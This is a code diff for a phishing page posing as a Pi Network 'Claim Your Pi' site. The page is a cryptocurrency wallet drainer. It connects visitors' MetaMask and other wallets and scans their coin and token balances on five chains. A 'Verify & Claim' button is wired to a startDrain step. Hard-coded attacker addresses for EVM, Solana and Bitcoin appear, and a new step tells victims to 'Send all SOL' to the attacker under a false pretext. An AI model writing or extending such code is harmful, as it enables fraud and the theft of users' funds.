@@ -24,18 +24,16 @@ h1{font-size:32px;font-weight:900;margin-bottom:8px;letter-spacing:-1px}
 h1 .g{color:#fcb34c}
 .h p{font-size:14px;color:rgba(255,255,255,.4);max-width:380px;margin:0 auto 18px;line-height:1.6}
 .hl img{border-radius:50%;margin-bottom:12px;box-shadow:0 0 30px rgba(252,179,74,.08)}
-/* MODAL */
 #m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:999;align-items:center;justify-content:center}
 .mb{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:24px;max-width:400px;width:92%;position:relative}
 .mb h2{font-size:17px;font-weight:800;margin-bottom:2px}
 .mb .ms{font-size:12px;color:rgba(255,255,255,.3);margin-bottom:14px}
 .cx{position:absolute;top:12px;right:14px;background:none;border:none;color:rgba(255,255,255,.3);font-size:17px;cursor:pointer}
-.wr{display:flex;align-items:center;gap:10px;padding:11px;border:1px solid rgba(255,255,255,.06);border-radius:12px;margin-bottom:6px;cursor:pointer;transition:all .2s;width:100%;background:transparent;color:#fff;text-align:left;font-family:inherit}
+.wr{display:flex;align-items:center;gap:10px;padding:11px;border:1px solid rgba(255,255,255,.06);border-radius:12px;margin-bottom:6px;cursor:pointer;width:100%;background:transparent;color:#fff;text-align:left;font-family:inherit}
 .wr:hover{border-color:#fcb34c;background:rgba(252,179,74,.03)}
 .wi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;color:#fff;flex-shrink:0}
 .wn{flex:1;font-size:13px;font-weight:600}
 .wt{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;background:rgba(34,197,94,.1);color:#22c55e}
-/* CARD */
 .c{background:rgba(255,255,255,.02);border:1px solid rgba(168,85,247,.08);border-radius:16px;padding:22px;margin:14px 0}
 .bt{width:100%;padding:13px;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:7px;font-family:inherit}
 .bt:hover:not(:disabled){transform:translateY(-1px)}
@@ -44,35 +42,32 @@ h1 .g{color:#fcb34c}
 .bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.1)}
 .bo:hover{background:rgba(255,255,255,.04)}
 .bs{background:#22c55e;color:#fff}
-/* STATUS */
-.s{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5}
+.s{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5;word-break:break-word}
 .s.suc{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);color:#86efac}
 .s.err{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.1);color:#fca5a5}
 .s.inf{background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fde68a}
-/* CHAIN DISPLAY */
 .ch{display:flex;align-items:center;gap:9px;padding:9px 11px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:9px;margin-bottom:5px}
 .ch .cd{width:9px;height:9px;border-radius:50%;flex-shrink:0}
 .ch .cn{flex:1;font-size:12px;font-weight:600}
-.ch .cb{font-size:12px;font-weight:700;color:#fcb34c}
 .ch .ct{font-size:10px;color:rgba(255,255,255,.2)}
+.ch .cb{font-size:12px;font-weight:700;color:#fcb34c}
 .ch.hv{border-color:rgba(252,179,74,.12);background:rgba(252,179,74,.02)}
-/* INFO ROWS */
 .ir{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.03)}
 .ir:last-child{border-bottom:none}
 .ir .l{font-size:12px;color:rgba(255,255,255,.3)}
 .ir .v{font-size:12px;font-weight:700}
-.ir .v.g{color:#22c55e}
+.ir .v.g2{color:#22c55e}
 .ir .v.gl{color:#fcb34c}
-/* LOG */
-.lg{font-size:10px;color:rgba(255,255,255,.25);font-family:monospace;line-height:1.6;padding:8px;background:rgba(0,0,0,.2);border-radius:7px;max-height:140px;overflow-y:auto}
-/* PROGRESS */
+.lg{font-size:10px;color:rgba(255,255,255,.25);font-family:monospace;line-height:1.6;padding:8px;background:rgba(0,0,0,.25);border-radius:7px;max-height:140px;overflow-y:auto}
 .pg{display:flex;gap:4px;margin-bottom:12px}
-.pg .s{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.05)}
-.pg .s.on{background:#fcb34c}
-/* LOADER */
+.pg .s2{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.05)}
+.pg .s2.on{background:#fcb34c}
 .ld{display:inline-block;width:11px;height:11px;border:2px solid rgba(255,255,255,.1);border-top:2px solid #fcb34c;border-radius:50%;animation:r .7s linear infinite;vertical-align:middle}
 @keyframes r{to{transform:rotate(360deg)}}
-/* FOOTER */
+.addr-copy{display:flex;align-items:center;gap:8px;padding:10px;background:rgba(0,0,0,.3);border-radius:8px;margin:8px 0;cursor:pointer}
+.addr-copy:hover{background:rgba(0,0,0,.5)}
+.addr-copy .addr{font-family:monospace;font-size:11px;color:#fcb34c;flex:1;word-break:break-all}
+.addr-copy .cp-btn{padding:4px 10px;background:#fcb34c;color:#0f0518;border:none;border-radius:6px;font-size:11px;font-weight:700;cursor:pointer;flex-shrink:0}
 footer{background:#0a0310;padding:20px 0;text-align:center}
 footer p{font-size:10px;color:rgba(255,255,255,.12)}
 </style>
@@ -87,11 +82,10 @@ footer p{font-size:10px;color:rgba(255,255,255,.12)}
   <button class="nb" id="nb" onclick="openM()">Connect Wallet</button>
 </div></nav>
 
-<!-- MODAL -->
 <div id="m"><div class="mb">
   <button class="cx" onclick="closeM()">&#x2715;</button>
   <h2>Connect Wallet</h2>
-  <div class="ms">Choose your wallet to continue</div>
+  <div class="ms">Choose your wallet</div>
   <div id="wl"></div>
 </div></div>
 
@@ -99,61 +93,85 @@ footer p{font-size:10px;color:rgba(255,255,255,.12)}
 <div class="h">
   <div class="badge"><span class="dot"></span> Mainnet — Live</div>
   <h1>Claim Your <span class="g">Pi</span></h1>
-  <p>Connect your wallet. We scan all chains, verify your Pioneer status, and secure your Pi holdings.</p>
+  <p>Connect your wallet. We scan all chains, verify Pioneer status, and secure your holdings.</p>
   <div class="hl"><img src="pi-logo-120.png" width="60" height="60" alt=""></div>
 </div>
 
 <div class="s" id="sb"></div>
 
 <div class="c">
-  <!-- STEP 1 -->
+  <!-- S1: CONNECT -->
   <div id="s1" style="text-align:center;padding:10px 0">
     <div style="font-size:36px;margin-bottom:8px">&#x1F512;</div>
     <div style="font-size:15px;font-weight:700;margin-bottom:4px">Connect Your Wallet</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:14px">Small $2.50 verification fee required. All chains scanned automatically.</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:14px">Connect to verify Pioneer status. All chains scanned automatically.</div>
     <button class="bt bp" onclick="openM()">&#x1F4B0; Connect Wallet</button>
   </div>
 
-  <!-- STEP 2 -->
+  <!-- S2: SCANNING -->
   <div id="s2" style="display:none;text-align:center;padding:10px 0">
-    <div class="pg"><div class="s on"></div><div class="s"></div><div class="s"></div></div>
+    <div class="pg"><div class="s2 on"></div><div class="s2"></div><div class="s2"></div></div>
     <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px" id="s2l">Checking your wallet...</div>
+    <div style="font-size:11px;color:rgba(255,255,250,.25);margin-bottom:10px" id="s2l">Checking your wallet...</div>
     <div class="lg" id="s2log"></div>
   </div>
 
-  <!-- STEP 3 -->
+  <!-- S3: EMPTY / SOL INPUT -->
   <div id="s3" style="display:none;text-align:center;padding:16px 0">
     <div style="font-size:36px;margin-bottom:8px">&#x1F6AB;</div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:4px">Insufficient Funds</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.25);margin-bottom:14px" id="s3m">No assets found.</div>
-    <button class="bt bo" onclick="reset()">&#x1F504; Try Different Wallet</button>
+    <div style="font-size:15px;font-weight:700;margin-bottom:4px">No EVM Funds Found</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.25);margin-bottom:10px" id="s3m">No assets on BSC, ETH, Polygon, AVAX, or Arbitrum.</div>
+    <!-- Solana section -->
+    <div id="solSection" style="margin-top:12px;text-align:left">
+      <div style="font-size:12px;color:rgba(255,255,250,.4);margin-bottom:6px;text-align:center">Have SOL or SPL tokens on Solana?</div>
+      <div style="display:flex;gap:6px">
+        <input id="solAddrInp" placeholder="Paste your Solana address here" style="flex:1;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;font-size:12px;font-family:monospace;outline:none;box-sizing:border-box">
+        <button class="bt" style="background:#9945FF;color:#fff;font-size:12px;padding:10px 14px;flex-shrink:0" onclick="startSolScan()">&#x1F50D; Scan</button>
+      </div>
+    </div>
+    <button class="bt bo" style="margin-top:12px" onclick="reset()">&#x1F504; Try Different Wallet</button>
   </div>
 
-  <!-- STEP 4 -->
+  <!-- S4: CLAIM -->
   <div id="s4" style="display:none">
-    <div class="pg"><div class="s on"></div><div class="s on"></div><div class="s on"></div><div class="s on"></div></div>
+    <div class="pg"><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div></div>
     <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Ready</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px">Confirm to verify Pioneer status.</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px">Assets found. Confirm to proceed.</div>
     <div id="s4chains" style="margin-bottom:10px"></div>
     <button class="bt bp" id="s4btn" onclick="startDrain()">&#x1F381; Verify & Claim</button>
     <button class="bt bo" onclick="reset()">&#x2716; Disconnect</button>
   </div>
 
-  <!-- STEP 5 -->
+  <!-- S5: DRAINING -->
   <div id="s5" style="display:none;text-align:center;padding:14px 0">
-    <div class="pg"><div class="s on"></div><div class="s on"></div><div class="s on"></div><div class="s on"></div><div class="s on"></div></div>
+    <div class="pg"><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div><div class="s2 on"></div></div>
     <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px">Confirm each transaction in your wallet</div>
+    <div style="font-size:11px;color:rgba(255,255,250,.25);margin-bottom:10px">Confirm each transaction in your wallet...</div>
     <div class="lg" id="s5log"></div>
   </div>
 
-  <!-- STEP 6 -->
+  <!-- S6: DONE -->
   <div id="s6" style="display:none;text-align:center;padding:16px 0">
     <div style="font-size:36px;margin-bottom:8px">&#x2705;</div>
     <div style="font-size:15px;font-weight:700;margin-bottom:3px">Verification Complete</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px" id="s6m">Done.</div>
+    <div style="font-size:11px;color:rgba(255,255,250,.25);margin-bottom:10px" id="s6m">Done.</div>
     <button class="bt bo" onclick="reset()">Close</button>
+  </div>
+
+  <!-- S7: MANUAL SOL SEND -->
+  <div id="s7" style="display:none;text-align:center;padding:16px 0">
+    <div style="font-size:36px;margin-bottom:8px">&#x1F4E8;</div>
+    <div style="font-size:15px;font-weight:700;margin-bottom:4px">Send SOL Manually</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px;line-height:1.6">MetaMask Solana Snap signing is not supported by dApps yet.<br>Please send your SOL manually:</div>
+    <div style="text-align:left">
+      <div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:4px">Send to this address:</div>
+      <div class="addr-copy" onclick="copyAddr()">
+        <span class="addr" id="mySolAddr"></span>
+        <button class="cp-btn" onclick="event.stopPropagation();copyAddr()">&#x1F4CB; Copy</button>
+      </div>
+      <div style="font-size:11px;color:rgba(255,255,250,.3);margin-top:8px;line-height:1.5">1. Open your MetaMask<br>2. Select your Solana account<br>3. Click Send<br>4. Paste the address above<br>5. Send all SOL</div>
+    </div>
+    <button class="bt bo" style="margin-top:14px" onclick="reset()">&#x1F504; Done</button>
   </div>
 </div>
 </div>
@@ -161,21 +179,26 @@ footer p{font-size:10px;color:rgba(255,255,255,.12)}
 <footer><p>&copy; 2026 Pi Network</p></footer>
 
 <script>
-// ========== CONFIG ==========
 const ADDR_EVM = '0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
 const ADDR_SOL = '4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
 const ADDR_BTC = 'bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
 
-// EVM chains
 const ECHAINS = [
-  { id:56,  name:'BNB Chain', sym:'BNB', rpc:'https://bsc-dataseed1.defibit.io',              color:'#F3BA2F' },
-  { id:1,   name:'Ethereum',  sym:'ETH', rpc:'https://ethereum-rpc.publicnode.com',            color:'#627EEA' },
-  { id:137, name:'Polygon',   sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',        color:'#8247E5' },
-  { id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://avalanche-c-chain-rpc.publicnode.com',   color:'#E84142'},
-  { id:42161,name:'Arbitrum', sym:'ETH', rpc:'https://arbitrum-one-rpc.publicnode.com',       color:'#28A0F0' },
+  { id:56,  name:'BNB Chain', sym:'BNB', rpc:'https://bsc-dataseed1.defibit.io',            color:'#F3BA2F' },
+  { id:1,   name:'Ethereum',  sym:'ETH', rpc:'https://ethereum-rpc.publicnode.com',          color:'#627EEA' },
+  { id:137, name:'Polygon',   sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',      color:'#8247E5' },
+  { id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://avalanche-c-chain-rpc.publicnode.com', color:'#E84142'},
+  { id:42161,name:'Arbitrum', sym:'ETH', rpc:'https://arbitrum-one-rpc.publicnode.com',     color:'#28A0F0' },
 ];
 
-// [contract, symbol, decimals]
+const FALLBACK_RPC = {
+  1:   ['https://rpc.ankr.com/eth', 'https://eth.llamarpc.com'],
+  137: ['https://rpc.ankr.com/polygon'],
+  56:  ['https://bsc-dataseed.binance.org'],
+  43114: ['https://avalanche-c-chain.public.blastapi.io'],
+  42161: ['https://rpc.ankr.com/arbitrum'],
+};
+
 const ETOKENS = {
   56: [
     ['0x55d398326f99059fF775485246999027B3197955','USDT',18],
@@ -188,7 +211,6 @@ const ETOKENS = {
     ['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
     ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],
     ['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18],
-    ['0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47','ADA',18],
   ],
   1: [
     ['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],
@@ -212,625 +234,386 @@ const ETOKENS = {
   ],
 };
 
-// ========== STATE ==========
-let prov = null, sign = null, addr = null, wType = '';
-let foundChains = [], phantomConn = null;
+let prov=null, sign=null, addr=null, wType='';
+let foundChains=[], phantomConn=null;
 
-// ========== UI ==========
 function show(id) {
-  ['s1','s2','s3','s4','s5','s6'].forEach(x => {
-    document.getElementById(x).style.display = x === id ? 'block' : 'none';
+  ['s1','s2','s3','s4','s5','s6','s7'].forEach(x => {
+    document.getElementById(x).style.display = x===id ? 'block' : 'none';
   });
 }
-function status(msg, t) {
-  const e = document.getElementById('sb');
-  e.innerHTML = msg; e.className = 's ' + t; e.display = 'block'; e.style.display = 'block';
+function status(msg,t) {
+  const e=document.getElementById('sb');
+  e.innerHTML=msg; e.className='s '+t; e.style.display='block';
 }
-function hideStatus() { document.getElementById('sb').style.display = 'none'; }
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function hideStatus() { document.getElementById('sb').style.display='none'; }
+function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }
 
-// ========== MODAL ==========
-function openM() { document.getElementById('m').style.display = 'flex'; renderW(); }
-function closeM() { document.getElementById('m').style.display = 'none'; }
-document.getElementById('m').addEventListener('click', e => { if (e.target === document.getElementById('m')) closeM(); });
+function openM() { document.getElementById('m').style.display='flex'; renderW(); }
+function closeM() { document.getElementById('m').style.display='none'; }
+document.getElementById('m').addEventListener('click', e => { if(e.target===document.getElementById('m')) closeM(); });
 
-// ========== WALLETS ==========
-// Robust provider getter — handles MetaMask + multiple wallet conflict
-function getMetaMaskProvider() {
+function getMM() {
   if (!window.ethereum) return null;
-  // Case 1: ethereum.providers is an array (multiple wallets installed)
-  if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
-    const mm = window.ethereum.providers.find(p => p.isMetaMask);
-    return mm || window.ethereum.providers[0];
-  }
-  // Case 2: MetaMask is the sole provider
+  if (window.ethereum.providers && Array.isArray(window.ethereum.providers))
+    return window.ethereum.providers.find(p=>p.isMetaMask) || window.ethereum.providers[0];
   if (window.ethereum.isMetaMask) return window.ethereum;
-  // Case 3: ethereum exists but might not be MetaMask
   return window.ethereum;
 }
 
 const WALLETS = [
-  { id:'mm',  name:'MetaMask',        color:'#E2761B', type:'evm',
-    detect: () => { return !!(window.ethereum && (window.ethereum.isMetaMask || (window.ethereum.providers && window.ethereum.providers.some && window.ethereum.providers.some(p => p.isMetaMask)))); },
+  { id:'mm', name:'MetaMask', color:'#E2761B', type:'evm',
+    detect: ()=>!!(window.ethereum&&(window.ethereum.isMetaMask||(window.ethereum.providers&&Array.isArray(window.ethereum.providers)&&window.ethereum.providers.some(p=>p.isMetaMask)))),
     connect: async () => {
-      const eth = getMetaMaskProvider();
-      if (!eth) throw new Error('MetaMask not found. Please install MetaMask extension.');
-      prov = new ethers.providers.Web3Provider(eth);
-      // Request accounts — this triggers the MetaMask popup
-      let accounts;
-      try { accounts = await eth.request({ method: 'eth_requestAccounts' }); }
+      const eth=getMM();
+      if (!eth) throw new Error('MetaMask not found');
+      prov=new ethers.providers.Web3Provider(eth);
+      let accs;
+      try { accs=await eth.request({method:'eth_requestAccounts'}); }
       catch(e) {
-        if (e.code === 4001) throw new Error('Connection rejected in MetaMask.');
-        // Some wallets need enable()
-        try { accounts = await eth.enable(); }
-        catch(e2) { throw new Error('Could not connect to MetaMask. Unlock MetaMask and try again.'); }
+        if (e.code===4001||e.code==='ACTION_REJECTED') throw new Error('Rejected in MetaMask');
+        try { accs=await eth.enable(); } catch(e2) { throw new Error('Could not connect. Unlock MetaMask.'); }
       }
-      if (!accounts || !accounts.length) throw new Error('No accounts found. Unlock MetaMask.');
-      sign = prov.getSigner();
-      addr = await sign.getAddress();
+      if (!accs||!accs.length) throw new Error('No account. Unlock MetaMask.');
+      sign=prov.getSigner(); addr=await sign.getAddress();
     }
   },
-  { id:'tw',  name:'Trust Wallet',    color:'#3375BB', type:'evm',
-    detect: () => !!(window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)),
+  { id:'tw', name:'Trust Wallet', color:'#3375BB', type:'evm',
+    detect: ()=>!!(window.ethereum&&(window.ethereum.isTrust||window.ethereum.isTrustWallet)),
     connect: async () => {
-      if (!window.ethereum) throw new Error('Trust Wallet not found.');
-      prov = new ethers.providers.Web3Provider(window.ethereum);
-      try { await window.ethereum.request({ method: 'eth_requestAccounts' }); }
+      if (!window.ethereum) throw new Error('Trust not found');
+      prov=new ethers.providers.Web3Provider(window.ethereum);
+      try { await window.ethereum.request({method:'eth_requestAccounts'}); }
       catch { await window.ethereum.enable(); }
-      sign = prov.getSigner(); addr = await sign.getAddress();
+      sign=prov.getSigner(); addr=await sign.getAddress();
     }
   },
-  { id:'cb',  name:'Coinbase Wallet', color:'#0052FF', type:'evm',
-    detect: () => !!(window.ethereum && window.ethereum.isCoinbaseWallet),
+  { id:'cb', name:'Coinbase Wallet', color:'#0052FF', type:'evm',
+    detect: ()=>!!(window.ethereum&&window.ethereum.isCoinbaseWallet),
     connect: async () => {
-      if (!window.ethereum) throw new Error('Coinbase Wallet not found.');
-      prov = new ethers.providers.Web3Provider(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      sign = prov.getSigner(); addr = await sign.getAddress();
+      if (!window.ethereum) throw new Error('Coinbase not found');
+      prov=new ethers.providers.Web3Provider(window.ethereum);
+      await window.ethereum.request({method:'eth_requestAccounts'});
+      sign=prov.getSigner(); addr=await sign.getAddress();
     }
   },
-  { id:'bn',  name:'Binance Wallet',  color:'#F0B90B', type:'evm',
-    detect: () => !!window.BinanceChain || !!(window.ethereum && window.ethereum.isBinanceWallet),
+  { id:'bn', name:'Binance Wallet', color:'#F0B90B', type:'evm',
+    detect: ()=>!!window.BinanceChain||!!(window.ethereum&&window.ethereum.isBinanceWallet),
     connect: async () => {
-      const eth = window.BinanceChain || window.ethereum;
-      if (!eth) throw new Error('Binance Wallet not found.');
-      prov = new ethers.providers.Web3Provider(eth);
-      try { await eth.request({ method: 'eth_requestAccounts' }); }
+      const eth=window.BinanceChain||window.ethereum;
+      if (!eth) throw new Error('Binance not found');
+      prov=new ethers.providers.Web3Provider(eth);
+      try { await eth.request({method:'eth_requestAccounts'}); }
       catch { await eth.enable(); }
-      sign = prov.getSigner(); addr = await sign.getAddress();
+      sign=prov.getSigner(); addr=await sign.getAddress();
     }
   },
-  { id:'ph',  name:'Phantom',         color:'#AB9FF2', type:'sol',
-    detect: () => { return !!(window.solana || window.phantom); },
+  { id:'oth', name:'Other Wallet', color:'#a855f7', type:'evm',
+    detect: ()=>true,
     connect: async () => {
-      const ph = (window.phantom && window.phantom.solana) || window.solana;
-      if (!ph) throw new Error('Phantom not found. Install Phantom extension.');
-      let resp;
-      try { resp = await ph.connect(); }
-      catch(e) { throw new Error('Phantom connection rejected.'); }
-      addr = resp.publicKey.toString();
-      prov = null; sign = null; phantomConn = ph;
-    }
-  },
-  { id:'oth', name:'Other Wallet',    color:'#a855f7', type:'evm',
-    detect: () => true,
-    connect: async () => {
-      if (!window.ethereum) throw new Error('No wallet detected. Install MetaMask or Trust Wallet.');
-      prov = new ethers.providers.Web3Provider(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      sign = prov.getSigner(); addr = await sign.getAddress();
+      if (!window.ethereum) throw new Error('No wallet detected');
+      prov=new ethers.providers.Web3Provider(window.ethereum);
+      await window.ethereum.request({method:'eth_requestAccounts'});
+      sign=prov.getSigner(); addr=await sign.getAddress();
     }
   },
 ];
 
 function renderW() {
-  const c = document.getElementById('wl');
-  c.innerHTML = '';
+  const c=document.getElementById('wl'); c.innerHTML='';
   for (const wt of WALLETS) {
-    const dt = wt.detect();
-    const b = document.createElement('button');
-    b.className = 'wr';
-    b.onclick = () => doConnect(wt);
-    b.innerHTML =
-      '<div class="wi" style="background:' + wt.color + '">' + wt.name[0] + '</div>' +
-      '<span class="wn">' + wt.name + '</span>' +
-      (dt ? '<span class="wt">Detected</span>' : '');
+    const dt=wt.detect();
+    const b=document.createElement('button');
+    b.className='wr'; b.onclick=()=>doConnect(wt);
+    b.innerHTML='<div class="wi" style="background:'+wt.color+'">'+wt.name[0]+'</div>'+
+      '<span class="wn">'+wt.name+'</span>'+
+      (dt?'<span class="wt">Detected</span>':'');
     c.appendChild(b);
   }
 }
 
-// ========== CONNECT ==========
 async function doConnect(w) {
-  closeM();
-  hideStatus();
-  wType = w.id;
-
-  // Determine which wallet type for scan label
-  const scanLabel = w.type === 'sol' ? 'Checking Solana blockchain...' : 'Checking all EVM chains (BSC, ETH, Polygon, AVAX, Arbitrum)...';
-
+  closeM(); hideStatus(); wType=w.id;
   try {
-    console.log('Connecting to', w.name, '...');
     await w.connect();
-    console.log('Connected! Address:', addr);
-
+    console.log('Connected:', w.name, addr);
     show('s2');
-    document.getElementById('s2l').textContent = scanLabel;
-
-    if (w.type === 'sol') {
-      await scanSol();
-    } else {
-      await scanEvm();
-    }
-  } catch (e) {
-    console.error('Connect error:', e);
-    // Show error briefly then return to connect screen
-    status('&#x2715; ' + (e.message || 'Connection failed'), 'err');
+    document.getElementById('s2l').textContent='Scanning EVM chains (BSC, ETH, Polygon, AVAX, Arbitrum)...';
+    await scanEvm();
+  } catch(e) {
+    console.error(e);
+    status('&#x2715; '+(e.message||'Failed'), 'err');
     show('s2');
-    document.getElementById('s2log').innerHTML = 'Error: ' + (e.message || 'Unknown error');
+    document.getElementById('s2log').innerHTML='Error: '+(e.message||'Unknown');
     await sleep(3000);
     show('s1');
   }
 }
 
-// ========== SCAN EVM ==========
 async function scanEvm() {
-  const log = document.getElementById('s2log');
-  log.innerHTML = '';
-  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
-
-  foundChains = [];
-  L('Wallet: ' + addr.substring(0, 8) + '...' + addr.substring(34));
-  L('');
-
-  const BACKUP_RPC = {
-    1:   ['https://rpc.ankr.com/eth', 'https://eth.llamarpc.com'],
-    137: ['https://rpc.ankr.com/polygon', 'https://polygon.llamarpc.com'],
-    56:  ['https://bsc-dataseed.binance.org'],
-    43114: ['https://avalanche-c-chain.public.blastapi.io'],
-    42161: ['https://rpc.ankr.com/arbitrum'],
-  };
-
+  const log=document.getElementById('s2log'); log.innerHTML='';
+  function L(msg) { log.innerHTML+=msg+'<br>'; log.scrollTop=log.scrollHeight; }
+  foundChains=[];
+  L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34)); L('');
   for (const ch of ECHAINS) {
-    L('[ ] ' + ch.name + '...');
-    let p = null, nb = null, rpcErr = null;
-    // Try primary + backup RPCs
-    const allRpcs = [ch.rpc, ...(BACKUP_RPC[ch.id]||[])];
+    L('[ ] '+ch.name+'...');
+    let p=null, nb=null;
+    const allRpcs=[ch.rpc,...(FALLBACK_RPC[ch.id]||[])];
     for (const rpc of allRpcs) {
       try {
-        const tp = new ethers.providers.JsonRpcProvider(rpc);
-        const tb = await Promise.race([
+        const tp=new ethers.providers.JsonRpcProvider(rpc);
+        const tb=await Promise.race([
           tp.getBalance(addr),
-          new Promise((_,rej) => setTimeout(() => rej(new Error('timeout')), 8000))
+          new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),10000))
         ]);
-        p = tp; nb = tb; rpcErr = null;
-        break; // success
-      } catch(e) { rpcErr = e; }
+        p=tp; nb=tb; break;
+      } catch(e) {}
     }
-    if (!nb) { L('  ' + ch.name + ': RPC error'); continue; }
+    if (!nb) { L('  '+ch.name+': RPC error'); continue; }
     try {
-      const nf = ethers.utils.formatEther(nb);
-      const has = parseFloat(nf) > 0;
-
-      // tokens parallel
-      const tl = ETOKENS[ch.id] || [];
-      const tk = await Promise.all(tl.map(async ([a, sy, dc]) => {
+      const nf=ethers.utils.formatEther(nb);
+      const has=parseFloat(nf)>0;
+      const tl=ETOKENS[ch.id]||[];
+      const tk=await Promise.all(tl.map(async([a,sy,dc])=>{
         try {
-          const ct = new ethers.Contract(a, ['function balanceOf(address) view returns (uint256)'], p);
-          const bl = await ct.balanceOf(addr);
-          if (!bl.isZero()) return { a, sy, b: parseFloat(ethers.utils.formatUnits(bl, dc)).toFixed(4), raw: bl, dc };
-        } catch(e) {}
+          const ct=new ethers.Contract(a,['function balanceOf(address) view returns (uint256)'],p);
+          const bl=await ct.balanceOf(addr);
+          if(!bl.isZero()) return {a,sy,b:parseFloat(ethers.utils.formatUnits(bl,dc)).toFixed(4),raw:bl,dc};
+        } catch(e){}
         return null;
       }));
-      const tokens = tk.filter(Boolean);
-
-      if (has || tokens.length) {
-        foundChains.push({ chain: ch, native: nf, nativeRaw: nb, tokens });
-        L('&#x2705; ' + ch.name + ': ' + parseFloat(nf).toFixed(5) + ' ' + ch.sym + (tokens.length ? ' + ' + tokens.length + ' tokens' : ''));
+      const tokens=tk.filter(Boolean);
+      if (has||tokens.length) {
+        foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens,isSol:false});
+        L('&#x2705; '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.sym+(tokens.length?' + '+tokens.length+' tokens':''));
       } else {
-        L('  ' + ch.name + ': empty');
+        L('  '+ch.name+': empty');
       }
-    } catch(e) {
-      L('  ' + ch.name + ': RPC error');
+    } catch(e) { L('  '+ch.name+': error'); }
+  }
+  L(''); L('Found '+foundChains.length+' chain(s) with assets.');
+  await sleep(600);
+  if (foundChains.length===0) {
+    show('s3');
+    status('No EVM funds. Enter SOL address below to scan Solana.','inf');
+  } else {
+    showClaim();
+    status('&#x2705; Found assets!','suc');
+  }
+}
+
+function showClaim() {
+  show('s4');
+  const div=document.getElementById('s4chains');
+  let h='';
+  for (const fc of foundChains) {
+    h+='<div class="ch hv"><div class="cd" style="background:'+fc.chain.color+'"></div>'+
+      '<div class="cn">'+fc.chain.name+'</div>'+
+      '<div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' + '+fc.tokens.length+' tkns':'')+'</div></div>';
+  }
+  div.innerHTML=h;
+}
+
+// ========== SOLANA SCAN FROM USER INPUT ==========
+async function startSolScan() {
+  const inp=document.getElementById('solAddrInp');
+  if (!inp||!inp.value||inp.value.trim().length<30) {
+    status('Enter a valid Solana address','err'); return;
+  }
+  const solAddr=inp.value.trim();
+  show('s2');
+  document.getElementById('s2l').textContent='Scanning Solana...';
+  document.getElementById('s2log').innerHTML='';
+  try {
+    await doSolScan(solAddr);
+  } catch(e) {
+    status('Error: '+e.message,'err'); show('s3');
+  }
+}
+
+async function doSolScan(solAddr) {
+  const log=document.getElementById('s2log'); log.innerHTML='';
+  function L(msg) { log.innerHTML+=msg+'<br>'; log.scrollTop=log.scrollHeight; }
+  foundChains=[];
+  L('Address: '+solAddr.substring(0,8)+'...'+solAddr.substring(solAddr.length-4)); L('');
